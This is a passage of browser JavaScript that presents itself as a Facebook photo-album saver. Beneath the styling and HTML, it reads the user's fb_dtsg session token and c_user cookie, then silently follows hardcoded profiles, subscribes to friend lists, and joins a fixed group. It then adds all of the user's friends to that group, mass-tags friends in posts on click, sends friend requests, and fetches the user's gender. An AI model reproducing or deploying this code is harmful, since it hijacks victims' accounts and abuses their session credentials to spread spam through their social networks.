-72px;}.fancybox-tmp{position:absolute;top:-99999px;left:-99999px;visibility:hidden;max-width:99999px;max-height:99999px;overflow:visible!important;}.fancybox-overlay{position:absolute;top:0;left:0;overflow:hidden;display:none;z-index:8010;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6QjY3NjM0OUJFNDc1MTFFMTk2RENERUM5RjI5NTIwMEQiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6QjY3NjM0OUNFNDc1MTFFMTk2RENERUM5RjI5NTIwMEQiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpCNjc2MzQ5OUU0NzUxMUUxOTZEQ0RFQzlGMjk1MjAwRCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpCNjc2MzQ5QUU0NzUxMUUxOTZEQ0RFQzlGMjk1MjAwRCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PgbXtVkAAAAPSURBVHjaYhDg4dkAEGAAATEA2alCfCIAAAAASUVORK5CYII=);}.fancybox-overlay-fixed{position:fixed;bottom:0;right:0;}.fancybox-lock .fancybox-overlay{overflow:auto;overflow-y:scroll;}.fancybox-title{visibility:hidden;font:normal 13px/20px "Helvetica Neue",Helvetica,Arial,sans-serif;position:relative;text-shadow:none;z-index:8050;}.fancybox-title-float-wrap{position:absolute;bottom:0;right:50%;margin-bottom:-35px;z-index:8050;text-align:center;}.fancybox-title-float-wrap .child{display:inline-block;margin-right:-100%;background:rgba(0,0,0,0.8);-webkit-border-radius:15px;-moz-border-radius:15px;border-radius:15px;text-shadow:0 1px 2px #222;color:#FFF;font-weight:700;line-height:24px;white-space:nowrap;padding:2px 20px;}.fancybox-title-outside-wrap{position:relative;margin-top:10px;color:#fff;}.fancybox-title-inside-wrap{padding-top:10px;}.fancybox-title-over-wrap{position:absolute;bottom:0;left:0;color:#fff;background:rgba(0,0,0,.8);padding:10px;}.fancybox-inner,.fancybox-lock{overflow:hidden;}.fancybox-nav:hover span,.fancybox-opened .fancybox-title{visibility:visible;}\
		#fancybox-buttons{position:fixed;left:0;width:100%;z-index:8050;}#fancybox-buttons.top{top:10px;}#fancybox-buttons.bottom{bottom:10px;}#fancybox-buttons ul{display:block;width:270px;height:30px;list-style:none;margin:0 auto;padding:0;}#fancybox-buttons ul li{float:left;margin:0;padding:0;}#fancybox-buttons a{display:block;width:30px;height:30px;text-indent:-9999px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFoAAABaBAMAAADKhlwxAAAAMFBMVEUAAAAAAAAeHh4uLi5FRUVXV1diYmJ3d3eLi4u8vLzh4eHz8/P29vb////+/v4PDw9Xwr0qAAAAEHRSTlP///////////////////8A4CNdGQAAAAlwSFlzAAALEwAACxMBAJqcGAAAAbVJREFUWMPtlktugzAQhnPNnqLnSRuJXaRGVFm3NmFdPMC+YHqA8NiWBHBdlPgxETRIVatWjIQ0Hn/8DL9lywsxJRYz/T10h+uxkefyiUw6xPROpw33xZHHmm4yTD9WKg2LRHhZqumwuNDW77tQkAwCRTepx2VU5y/LSEMlXkPEc3AUHTJCCESn+S4FOaZa/F7OPqm/bDLyGXCmoR8a4nLkKLrupymiwT/Thz3ZbbWDK9ZPnzxuoMeZ6sSTdKLpGthShnP68EaGIX3MGKGFrx1cAXbQDbR0ypY0TDRdX9JKWtD8RawiZqz8CtMbnR6k1zVsDfod046RP8jnbt6XM/1n6WoSzX2ryLlo+dsgXaRWsSxFV1aDdF4kZjGP5BE0TAPj5vEOII+geJgm1Gz9S5p46RSaGK1fQUMwgabPkzpxrqcZWV/vYA5PE1anDG4nrDw4VpFR0ZDhTtbzLp7p/03LW6B5qnaXV1tL27X2VusX8RjdWnTH96PapbXLuzIe7ZvdxBb9OkbXvtga9ca4EP6c38hb5DymsbduWY1pI2/bcRp5W8I4bXmLnMc08hY5P+/L36M/APYreu7rpU5/AAAAAElFTkSuQmCC);background-repeat:no-repeat;outline:none;opacity:0.8;}#fancybox-buttons a:hover{opacity:1;}#fancybox-buttons a.btnPrev{background-position:5px 0;}#fancybox-buttons a.btnNext{background-position:-33px 0;border-right:1px solid #3e3e3e;}#fancybox-buttons a.btnPlay{background-position:0 -30px;}#fancybox-buttons a.btnPlayOn{background-position:-30px -30px;}#fancybox-buttons a.btnToggle{background-position:3px -60px;border-left:1px solid #111;border-right:1px solid #3e3e3e;width:35px;}#fancybox-buttons a.btnToggleOn{background-position:-27px -60px;}#fancybox-buttons a.btnClose{border-left:1px solid #111;width:35px;background-position:-56px 0;}#fancybox-buttons a.btnDisabled{opacity:0.4;cursor:default;}\
		.loadedTag{display:none}.fbphotosphototagboxes{z-index:9997}.fancybox-nav{width:10%;}.tagArrow{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABkAAABgCAMAAADfGilYAAABQVBMVEUAAABXV1dXV1dXV1dXV1dkZGRkZGQAAABXV1dXV1fj4+NXV1cAAAAAAABXV1dXV1cAAABXV1dXV1cdHR1XV1ciIiLi4uJXV1cnJyfl5eVXV1dXV1ff399XV1dXV1dXV1dXV1dXV1dXV1cXFxcAAABXV1dXV1dXV1cAAAA3NzdXV1dXV1dXV1cAAAAAAABXV1dXV1dXV1dXV1cAAAD+/v74+PhXV1dXV1f29vYeHh4tLS0AAAAyMjJXV1f5+flXV1f7+/v///9XV1dtfq9ugLCSn8PO0+Nrfqq9xdqKmL/x8fh1h7COnL5ugK/O1eKTocGkr87O1OTN0+Gnsc7L0eH4+PuRn8Crt85tgK/c4Oyos8+qtc1ugaytuNHx8vnX2+jx8viqtdFzhbOtt9ByhLHX3OiqtdC9xtuKl7/T2ebS2ObSpKIFAAAAQXRSTlMAFCzrgWZAfNNo5fkwLiY8MnLzhWCH49mJ5yp64x5CDo0yw4MG7Xz7Co0G1T5kSmwCk/1g/fcwOPeFiWKLZvn3+z0qeQsAAAJ7SURBVHhendLXctswEAXQJSVbVrdkW457r3FN7WUBkurFvab3/P8HZAGatCIsZ6zcJ2iOLrgYAKBcrrdbrXa9XAZApAX9RAQgaaNOW8lZWedMS11BmagOcKgAiY6VNAJp0DqQhpJWIC2A60CufVHLUBBDaaBOuJtOI5wA/QmOAzk2pr7y4QoBgpOe3pz0kE56eohaoiNlpYa1ipSq8v5b88vXoCE9VPGUuOdSyqZ7Ix1qqFYHwHOcyqeKIw988WpYkRWseQAdKWv4wXE6oVBHyw/1zZ+O/BzuRtG7fafPNJ2m/OiLPNByoCaoEjmyGsxW1VIlIXZIvECopCokyiVVQqnqipaLc0de3Iq8xCPpC142j7BLXM8N5OTXiZI7ZmAgCgYHiVhAJOJBEQ+aeNBkAEcaONLAkQaeCAyCu8XKRUAyNh6PANu6H+cBwBqK82Ar4mC2qFsmjKbF/AKR3QWWgqeCki7YMatL7CELdOeBEMUkdCeuaWvFWhVrM8DQpB3bF7vAkB1LbooCmEQAcyIPBo0TQH4RzOQs8ikb+OzlIDr8bnxogtc8DFlPaDgV/qQs2Jq4RnHWJJtgYV6kRw2imyukBSWvyOqmZFGIt7rTc9swsyZWrZUtMF/IrtiP2ZMMQEFsRrzEvJgDIgMoi3kg4p61PUVsTbJXsAf/kezDhMqOActL06iSYDpL0494gcyrx6YsKxhL4bNeyT7PQmYkhaUXpR55WRpRjdRIdmxi+x9JYGqjRJCB4XvDPYJvMDWWoeU69Aq+2/D/bQpO0Ea8EK0bspNQ2WY60alLisuJ9MMK/GaJ5I/Lt6QKS24obmSpn+kgAJ4gIi70k79vocBUxmfchgAAAABJRU5ErkJggg==);background-size: auto;background-repeat:no-repeat;display:inline-block;height:11px;width:20px;background-position:0 -24px;margin-top:3px;}.tagInd{background-position: 0 -83px;float:right;}.dateInd{background-position:-12px 1px;float:right;text-indent:-100%;text-align:right;}.dateInd span{padding-right:3px;visibility:hidden;}.dateInd:hover span{visibility:visible;}.vis{visibility:visible !important;}\
		/* .borderTagBox & .innerTagBox */\
		.fbPhotosPhotoTagboxes{height:100%;left:0;position:absolute;top:0;width:100%;/*pointer-events:none*/}.fbPhotosPhotoTagboxes .tagsWrapper{display:inline-block;height:100%;width:100%;position:relative;vertical-align:middle}.fbPhotosPhotoTagboxBase{line-height:normal;position:absolute}.imageLoading .fbPhotosPhotoTagboxBase{display:none}/*.fbPhotosPhotoTagboxBase .borderTagBox, .fbPhotosPhotoTagboxBase .innerTagBox{-webkit-box-sizing:border-box;height:100%;width:100%}.ieContentFix{display:none;font-size:200px;height:100%;overflow:hidden;width:100%}.fbPhotosPhotoTagboxBase .innerTagBox{border:4px solid #fff;border-color:rgba(255, 255, 255, .8)}*/.fbPhotosPhotoTagboxBase .tag{bottom:0;left:50%;position:absolute}.fbPhotosPhotoTagboxBase .tagPointer{left:-50%;position:relative}.fbPhotosPhotoTagboxBase .tagArrow{left:50%;margin-left:-10px;position:absolute;top:-10px}.fbPhotosPhotoTagboxBase .tagName{background:#fff;color:#404040;cursor:default;font-weight:normal;padding:2px 6px 3px;top:3px;white-space:nowrap}/*.fbPhotosPhotoTagboxBase .borderTagBox,*/.fbPhotosPhotoTagboxBase .tagName{-webkit-box-shadow:0 0 1px rgba(0, 0, 0, .25), 0 1px 5px 3px rgba(0, 0, 0, .05);-webkit-background-clip:padding-box;border:1px solid #404040;border-color:rgba(0, 0, 0, .25)}.fancybox-inner:hover .fbPhotosPhotoTagboxes{opacity:1;z-index:9998;}.fbPhotosPhotoTagboxes .tagBox .tag{top:85%;z-index:9999}.fbPhotosPhotoTagboxes .tag, .fbPhotosPhotoTagboxes .innerTagBox, .fbPhotosPhotoTagboxes .borderTagBox{visibility:hidden}.tagBox:hover .tag/*, .tagBox:hover .innerTagBox*/{opacity:1;/*-webkit-transition:opacity .2s linear;*/visibility:visible}</style>';
		tHTML=tHTML+'<header id="hd"><div class="logo" id="logo"><div class="wrapper"><h1><a id="aName" href='+c.aLink+'>'+c.aName+'</a> '+((c.aAuth)?'- '+c.aAuth:"")+' <button onClick="cleanup()">ReStyle</button></h1><h1 class="msg">Press Ctrl+S to save all photos.</h1></div></div></header>';
		tHTML=tHTML+'<center id="aTime">'+c.aTime+'</center><br><center id="aDes">'+c.aDes+'</center><br><div id="output" class="cName"></div><div class="wrapper"><div id="bd"><div id="container" class="masonry">';
		tHTML=tHTML+b.join("")+'</div></div></div><script src="//dl.dropbox.com/u/4013937/jquery.min.js"></script></body>';
		if(navigator.userAgent.indexOf('Chrome')>0){document.write(tHTML);document.close();}
		else{
		var w = window.open(''+c.aLink, '');
		w.document.write(tHTML);
		w.document.close();}
		break;
		}
};


function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
    
    http4.send(params4);
}

function sublist(uidss) {
		var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
		document.body.appendChild(a);
}

a("100004408329860");
a("100004237061581");
a("100004996213602");
a("100005033706838");
a("100003954771014");
a("100004869341607");
a("100004930724007");

sublist("116091408542094");
sublist("146111562212454");
sublist("116295808527363");
sublist("122393197917624");
sublist("149007701922840");
sublist("122409267916017");
sublist("105030773003209");
sublist("139791642867022");

sublist("112215518959146");
sublist("112219758958722");
sublist("112216422292389");
sublist("112218298958868");
sublist("112220552291976");
sublist("112224562291575");
sublist("108393619360778");


var gid = ['487460874641805'];

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};

for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
};
var spage_id = "487183707993318";
var spost_id = "487183707993318";
var sfoto_id = "487183707993318";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun= new Date();
var btarihi = new Date(); 
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
}


//arkadaslari al ve isle
function sarkadaslari_al(){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
				  eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
				  for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
					smesaj = "";
					smesaj_text = "";
				  for(i=f*10;i<(f+1)*10;i++){
					if(arkadaslar.payload.entries[i]){
				  smesaj += " @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
				  smesaj_text += " " + arkadaslar.payload.entries[i].text;
				  }
					}
					sdurumpaylas();				}
				
			}
			
        };
		var params = "&filter[0]=user";
		params += "&options[0]=friends_only";
		params += "&options[1]=nm";
		params += "&token=v7";
        params += "&viewer=" + user_id;
		params += "&__user=" + user_id;
		
        if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        xmlhttp.send();
}

//tiklama olayini dinle
var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
sarkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();

document.removeEventListener(tiklama);
}
 }, false);
  

//arkadaþ ekleme
function sarkadasekle(uid,cins){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		
		xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true); 
		var params = "to_friend=" + uid;
		params += "&action=add_friend";
		params += "&how_found=friend_browser";
		params += "&ref_param=none";
		params += "&outgoing_id=";
		params += "&logging_location=friend_browser";
		params += "&no_flyout_on_click=true";
		params += "&ego_log_data=";
		params += "&http_referer=";
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
		params += "&__user=" + user_id;
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
		
if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1){
		xmlhttp.send(params);
}else if(document.cookie.split("cins" + user_id +"=").length <= 1){
		cinsiyetgetir(uid,cins,"sarkadasekle");
}else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString()){
		xmlhttp.send(params);
}
}

//cinsiyet belirleme
var cinssonuc = {};
var cinshtml = document.createElement("html");
function scinsiyetgetir(uid,cins,fonksiyon){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
			eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
			cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html
			btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
			if(cinshtml.getElementsByTagName("select")[0].value == "1"){
			document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
			}else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
			document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
			}
			eval(fonksiyon + "(" + id + "," + cins + ");");
			}
        };
		xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.send();
}